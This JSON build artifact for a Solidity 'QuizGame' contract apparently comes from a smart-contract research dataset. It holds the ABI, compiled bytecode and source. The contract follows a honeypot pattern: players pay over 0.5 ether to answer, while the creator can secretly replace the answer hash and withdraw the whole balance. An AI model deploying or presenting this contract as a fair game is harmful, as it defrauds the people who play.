{
  "contractName": "QuizGame",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "closed",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "StartGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160146101000a81548160ff02191690831515021790555034801561002b57600080fd5b506107698061003b6000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631f1c827f1461007a5780633e3ee8591461011c5780633fad9ae014610186578063597e1fb514610216578063648f0bde14610245578063f50ab24714610273575b005b61011a600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061027d565b005b610184600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610359565b005b34801561019257600080fd5b5061019b6103db565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101db5780820151818401526020810190506101c0565b50505050905090810190601f1680156102085780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561022257600080fd5b5061022b610479565b604051808215151515815260200191505060405180910390f35b61027160048036038101908080359060200190820180359060200191909192939192939050505061048c565b005b61027b61058b565b005b600060010260025460001916141561035557806040518082805190602001908083835b6020831015156102c557805182526020820191506020810190506020830392506102a0565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600281600019169055508160009080519060200190610312929190610698565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103b557600080fd5b81600090805190602001906103cb929190610698565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104715780601f1061044657610100808354040283529160200191610471565b820191906000526020600020905b81548152906001019060200180831161045457829003601f168201915b505050505081565b600160149054906101000a900460ff1681565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104c657600080fd5b8181604051808383808284378201915050925050506040518091039020600019166002546000191614801561050257506706f05b59d3b2000034115b801561051b5750600160149054906101000a900460ff16155b15610587573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561057d573d6000803e3d6000fd5b5061058661067c565b5b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105e757600080fd5b600160149054906101000a900460ff161561065f573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610659573d6000803e3d6000fd5b5061067a565b60018060146101000a81548160ff0219169083151502179055505b565b60018060146101000a81548160ff021916908315150217905550565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106106d957805160ff1916838001178555610707565b82800160010185558215610707579182015b828111156107065782518255916020019190600101906106eb565b5b5090506107149190610718565b5090565b61073a91905b8082111561073657600081600090555060010161071e565b5090565b905600a165627a7a72305820b7997e99f7f470054649100380e15590151c2356ba8010bb52ac381efb91bc360029",
  "source": "\n\ncontract QuizGame\n{\n    function Play(string _response)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        if(responseHash == keccak256(_response) && msg.value>0.5 ether && !closed)\n        {\n            msg.sender.transfer(this.balance);\n            GiftHasBeenSent();\n        }\n    }\n\n\n    string public question;\n\n    address questionSender;\n\n    bool public closed = false;\n\n    bytes32 responseHash;\n\n    function StartGame(string _question,string _response)\n    public\n    payable\n    {\n        if(responseHash==0x0)\n        {\n            responseHash = keccak256(_response);\n            question = _question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function StopGame()\n    public\n    payable\n    {\n       require(msg.sender == questionSender);\n       if (closed){\n           msg.sender.transfer(this.balance);\n       }else{\n           closed = true;\n       }\n    }\n\n    function NewQuestion(string _question, bytes32 _responseHash)\n    public\n    payable\n    {\n        require(msg.sender == questionSender);\n        question = _question;\n        responseHash = _responseHash;\n    }\n\n    function GiftHasBeenSent()\n    private\n    {\n        closed = true;\n    }\n\n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x2b98b39d39914b3aad05dd06a46868507156400d/contracts/0x2b98b39d39914b3aad05dd06a46868507156400d.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:50:39.998Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}